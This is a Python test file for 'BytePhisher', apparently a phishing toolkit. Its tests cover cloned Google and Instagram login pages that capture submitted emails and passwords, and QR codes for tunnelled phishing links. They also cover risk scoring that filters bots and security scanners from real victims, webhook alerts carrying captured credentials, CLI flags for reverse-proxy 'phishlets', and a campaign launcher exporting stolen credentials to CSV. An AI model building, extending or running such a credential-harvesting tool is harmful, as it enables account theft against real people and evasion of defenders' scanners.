"""BytePhisher advanced-feature tests: risk scoring, QR,
template rotation, alerts payloads — everything beyond the core capture path.

Run:  ./.venv/bin/python -m pytest tests/test_features.py -v
"""
import json
import os
import subprocess
import sys
import tempfile
import threading
import time
import urllib.parse
import urllib.request

import pytest
from conftest import TEMPLATES, free_port

from core import capture as cap
from core import links, risk
from core import server as srv

HERE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
PY = sys.executable


# ============================================================ risk engine ====
class TestRiskEngine:
    def test_clean_human_submission_is_low_risk(self):
        s, r = risk.score({"email": "a@b.com", "password": "x", "_ts": "9000"},
                          ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                             "(KHTML, like Gecko) Chrome/124.0 Safari/537.36",
                          isp="Airtel Broadband", device="windows", country="India",
                          city="Delhi")
        assert s < 30 and r == [], (s, r)

    def test_datacenter_ip_is_flagged(self):
        s, r = risk.score({"email": "a@b.com", "password": "x"},
                          ua="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36",
                          isp="OVH SAS", device="linux")
        assert s >= 30 and any("datacenter" in x for x in r), (s, r)

    def test_automation_user_agent_is_flagged(self):
        for ua in ("curl/8.4.0", "python-requests/2.31", "Mozilla/5.0 (compatible; Googlebot/2.1)",
                   "", "Go-http-client/1.1"):
            s, r = risk.score({"email": "a", "password": "b"}, ua=ua)
            assert any("user-agent" in x for x in r) or any("automation" in x for x in r), (ua, r)

    def test_honeypot_fill_is_flagged(self):
        s, r = risk.score({"email": "a", "password": "b", "hp_email": "bot@example.com"},
                          ua="Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 Chrome/124 Safari/537.36")
        assert s >= 40 and any("honeypot" in x for x in r)

    def test_instant_submit_is_flagged(self):
        s, r = risk.score({"email": "a", "password": "b", "_ts": "120"},
                          ua="Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 Chrome/124 Safari/537.36")
        assert any("fast" in x for x in r)

    def test_score_is_capped_at_100(self):
        s, r = risk.score({"email": "a", "password": "b", "hp_email": "x", "_ts": "50"},
                          ua="curl/8.0", isp="OVH SAS", device="unknown")
        assert s == 100 and len(r) >= 4

    def test_level_thresholds(self):
        assert risk.level(0) == "low" and risk.level(29) == "low"
        assert risk.level(30) == "medium" and risk.level(69) == "medium"
        assert risk.level(70) == "high" and risk.level(100) == "high"

    def test_is_likely_human(self):
        assert risk.is_likely_human({"is_cred": True, "risk": 10}) is True
        assert risk.is_likely_human({"is_cred": True, "risk": 80}) is False
        assert risk.is_likely_human({"is_cred": False, "risk": 0}) is False

    def test_score_handles_none_values(self):
        s, r = risk.score(None, ua=None, isp=None, device=None, country=None, city=None)
        assert isinstance(s, int) and isinstance(r, list)


class TestRiskThroughHTTP:
    def _serve(self):
        dbp = os.path.join(tempfile.mkdtemp(), "risk.db")
        port = free_port()
        httpd, _ = srv.serve(TEMPLATES, os.path.join(TEMPLATES, "03_google"), port, dbp,
                             geo_provider="off", campaign="risk")
        threading.Thread(target=httpd.serve_forever, daemon=True).start()
        time.sleep(0.3)
        return httpd, dbp, port

    def _post(self, port, data, ua):
        req = urllib.request.Request(
            f"http://127.0.0.1:{port}/", data=urllib.parse.urlencode(data).encode(),
            headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": ua})
        return urllib.request.urlopen(req, timeout=10).status

    def test_bot_traffic_gets_high_risk_and_human_low(self):
        httpd, dbp, port = self._serve()
        try:
            self._post(port, {"email": "bot@example.com", "password": "x"}, "curl/8.4.0")
            self._post(port, {"email": "human@example.com", "password": "y", "_ts": "9400"},
                       "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                       "(KHTML, like Gecko) Chrome/124.0 Safari/537.36")
            time.sleep(0.4)
            db = cap.CaptureDB(dbp)
            rows = {r["fields"]["email"]: r for r in db.all()}
            assert rows["bot@example.com"]["risk"] >= 40
            assert rows["bot@example.com"]["risk_reasons"]
            assert rows["human@example.com"]["risk"] < 30
            st = db.stats()
            assert st["credentials"] == 2 and st["credible_credentials"] == 1
            db.close()
        finally:
            httpd.shutdown()


# ================================================================== QR =======
class TestQR:
    def test_qr_png_is_written_and_valid(self):
        out = os.path.join(tempfile.mkdtemp(), "qr.png")
        path = links.qr_png("https://example.trycloudflare.com/", path=out)
        if path is None:
            pytest.skip("segno not installed")
        assert os.path.isfile(path)
        with open(path, "rb") as f:
            head = f.read(8)
        assert head == b"\x89PNG\r\n\x1a\n"          # real PNG magic
        assert os.path.getsize(path) > 200

    def test_qr_ascii_preview(self):
        pytest.importorskip("segno")
        art = links.qr_ascii("https://example.trycloudflare.com/")
        assert art and len(art) > 50          # must RETURN the art, not print it
        assert "█" in art or "#" in art or "▀" in art or "▄" in art

    def test_qr_svg(self):
        out = os.path.join(tempfile.mkdtemp(), "qr.svg")
        path = links.qr_svg("https://x.example.com/", path=out)
        if path is None:
            pytest.skip("segno not installed")
        assert "<svg" in open(path).read()[:400]


# ============================================================ rotation =======
class TestTemplateRotation:
    def test_rotation_serves_multiple_templates(self):
        dbp = os.path.join(tempfile.mkdtemp(), "rot.db")
        port = free_port()
        dirs = [os.path.join(TEMPLATES, f"0{i}_google") for i in (1, 2)]
        dirs = [os.path.join(TEMPLATES, "03_google"), os.path.join(TEMPLATES, "02_instagram")]
        httpd, _ = srv.serve(TEMPLATES, dirs[0], port, dbp, geo_provider="off",
                             rotate_dirs=dirs, campaign="ab-test")
        threading.Thread(target=httpd.serve_forever, daemon=True).start()
        time.sleep(0.3)
        try:
            seen = set()
            for _ in range(40):
                body = urllib.request.urlopen(f"http://127.0.0.1:{port}/", timeout=10).read().decode()
                seen.add("Google" if "Google" in body else "Instagram" if "Instagram" in body else "?")
            assert seen == {"Google", "Instagram"}, seen
        finally:
            httpd.shutdown()

    def test_rotation_captures_carry_tpl_field(self):
        dbp = os.path.join(tempfile.mkdtemp(), "rot2.db")
        port = free_port()
        dirs = [os.path.join(TEMPLATES, "03_google"), os.path.join(TEMPLATES, "02_instagram")]
        httpd, _ = srv.serve(TEMPLATES, dirs[0], port, dbp, geo_provider="off",
                             rotate_dirs=dirs, campaign="ab-test")
        threading.Thread(target=httpd.serve_forever, daemon=True).start()
        time.sleep(0.3)
        try:
            for _ in range(6):
                urllib.request.urlopen(f"http://127.0.0.1:{port}/", timeout=10).read()
            req = urllib.request.Request(
                f"http://127.0.0.1:{port}/",
                data=urllib.parse.urlencode({"username": "ab", "password": "x",
                                             "_tpl": "instagram"}).encode(),
                headers={"Content-Type": "application/x-www-form-urlencoded",
                         "User-Agent": "Mozilla/5.0 (iPhone) AppleWebKit/605.1.15"})
            urllib.request.urlopen(req, timeout=10).read()
            time.sleep(0.4)
            db = cap.CaptureDB(dbp)
            rows = db.all()
            assert rows and rows[0]["fields"]["_tpl"] == "instagram"
            assert rows[0]["campaign"] == "ab-test"
            db.close()
        finally:
            httpd.shutdown()


# ============================================================== alerts =======
class TestAlertPayloads:
    def test_payload_carries_campaign_and_risk(self):
        from conftest import StubHTTP

        from core.alerts import make_notifier
        stub = StubHTTP()
        try:
            dbp = os.path.join(tempfile.mkdtemp(), "al.db")
            port = free_port()
            httpd, _ = srv.serve(TEMPLATES, os.path.join(TEMPLATES, "03_google"), port, dbp,
                                 geo_provider="off", campaign="mailer-campaign",
                                 site_name="google",
                                 on_capture=make_notifier(webhook=stub.url, async_=False))
            threading.Thread(target=httpd.serve_forever, daemon=True).start()
            time.sleep(0.3)
            try:
                req = urllib.request.Request(
                    f"http://127.0.0.1:{port}/",
                    data=urllib.parse.urlencode({"email": "alert@corp.com", "password": "pw",
                                                 "_ts": "8000"}).encode(),
                    headers={"Content-Type": "application/x-www-form-urlencoded",
                             "User-Agent": "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 "
                                            "Chrome/124 Safari/537.36"})
                urllib.request.urlopen(req, timeout=10).read()
                time.sleep(0.5)
                assert len(stub.received) == 1
                cap_ = json.loads(stub.received[0]["body"])["capture"]
                assert cap_["campaign"] == "mailer-campaign"
                # geo_provider="off" costs the "no geo resolution" penalty (+5)
                assert cap_["risk"] <= 10
                assert cap_["risk_reasons"] == ["no geo resolution"]
                assert "risk" in stub.received[0]["body"].decode()
            finally:
                httpd.shutdown()
        finally:
            stub.stop()

    def test_format_capture_shows_risk_line(self):
        from core import alerts
        text = alerts.format_capture({
            "ts": 1, "campaign": "c1", "ip": "9.9.9.9", "device": "linux",
            "is_cred": True, "risk": 75,
            "risk_reasons": ["automation signature in user-agent (curl/)"],
            "fields": {"email": "a@b.c", "password": "x"}})
        assert "campaign : c1" in text
        assert "risk     : 75/100 (high)" in text
        assert "automation signature" in text


# ================================================================= CLI =======
class TestNewCLIFlags:
    def test_help_lists_new_flags(self):
        p = subprocess.run([PY, os.path.join(HERE, "bytephisher.py"), "--help"],
                           cwd=HERE, capture_output=True, text=True, timeout=60)
        out = p.stdout
        for flag in ("--telegram", "--webhook", "--mailto", "--campaign", "--qr",
                     "--rotate", "--proxy", "--phishlet", "--upstream"):
            assert flag in out, flag

    def test_qr_flag_generates_file(self):
        out = os.path.join(tempfile.mkdtemp(), "cli_qr.png")
        proc = subprocess.Popen([PY, os.path.join(HERE, "bytephisher.py"),
                                 "-o", "google", "-m", "test", "-p", str(free_port()),
                                 "--no-tui", "--geo", "off", "--qr", out],
                                cwd=HERE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        try:
            deadline = time.time() + 30
            buf = ""
            while time.time() < deadline and "QR code" not in buf:
                line = proc.stdout.readline()
                if not line:
                    break
                buf += line
            assert "QR code" in buf, buf
            assert os.path.isfile(out)
        finally:
            proc.terminate()
            try:
                proc.wait(timeout=10)
            except Exception:
                proc.kill()

    def test_import_site_cli(self, tmp_path):
        p = subprocess.run([PY, os.path.join(HERE, "tools", "import_site.py"),
                            "--file", os.path.join("tests", "fixtures", "custom_login.html"),
                            "--name", "CLI Import", "--slug", "cli-import-cli"],
                           cwd=HERE, capture_output=True, text=True, timeout=60)
        assert p.returncode == 0, p.stdout + p.stderr
        assert "imported ->" in p.stdout
        # clean up the template we just added to the real library
        man = json.load(open(os.path.join(TEMPLATES, "templates.json")))
        entry = [t for t in man if t["slug"] == "cli-import-cli"]
        if entry:
            import shutil
            shutil.rmtree(entry[0]["dir"], ignore_errors=True)
            man = [t for t in man if t["slug"] != "cli-import-cli"]
            json.dump(man, open(os.path.join(TEMPLATES, "templates.json"), "w"), indent=2)

    def test_cli_rotate_flag_in_local_mode(self):
        port = free_port()
        proc = subprocess.Popen([PY, os.path.join(HERE, "bytephisher.py"),
                                 "-o", "google", "--rotate", "google,instagram",
                                 "-m", "test", "-p", str(port), "--no-tui", "--geo", "off"],
                                cwd=HERE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        try:
            buf = ""
            deadline = time.time() + 30
            while time.time() < deadline and "server up" not in buf:
                line = proc.stdout.readline()
                if not line:
                    break
                buf += line
            assert "rotating" in buf and "server up" in buf, buf
            seen = set()
            for _ in range(30):
                body = urllib.request.urlopen(f"http://127.0.0.1:{port}/", timeout=10).read().decode()
                seen.add("Google" if "Google" in body else "Instagram")
            assert seen == {"Google", "Instagram"}
        finally:
            proc.terminate()
            try:
                proc.wait(timeout=10)
            except Exception:
                proc.kill()


# ==================================================== campaign launcher ======
class TestCampaignLauncher:
    """tools/campaign.sh: preflight -> run -> auto CSV export on exit."""

    def test_launcher_runs_and_exports(self):
        import signal as _signal
        camp = f"launcher-test-{int(time.time())}"
        port = free_port()
        proc = subprocess.Popen(
            ["bash", os.path.join(HERE, "tools", "campaign.sh"), "google", camp, "none"],
            cwd=HERE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        try:
            buf = ""
            deadline = time.time() + 90
            while time.time() < deadline and "server up" not in buf:
                line = proc.stdout.readline()
                if not line:
                    break
                buf += line
            assert "preflight" in buf, buf
            assert "server up" in buf, buf
            # drive one capture through it
            req = urllib.request.Request(
                f"http://127.0.0.1:8080/",
                data=urllib.parse.urlencode({"email": "launcher@example.com",
                                             "password": "L1!", "_ts": "7000"}).encode(),
                headers={"Content-Type": "application/x-www-form-urlencoded",
                         "User-Agent": "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 "
                                        "Chrome/124 Safari/537.36"})
            urllib.request.urlopen(req, timeout=10).read()
            time.sleep(1.0)
            proc.send_signal(_signal.SIGINT)
            rest, _ = proc.communicate(timeout=60)
            out = buf + rest
            assert "writing outputs" in out, out[-500:]
            csvf = os.path.join(HERE, "data", f"captures-{camp}.csv")
            assert os.path.isfile(csvf) and os.path.getsize(csvf) > 20
            assert "launcher@example.com" in open(csvf).read()
        finally:
            if proc.poll() is None:
                proc.kill()
            for f in (os.path.join(HERE, "data", f"captures-{camp}.csv"),
                      os.path.join(HERE, "data", f"qr-{camp}.png")):
                if os.path.isfile(f):
                    os.remove(f)
        _ = port
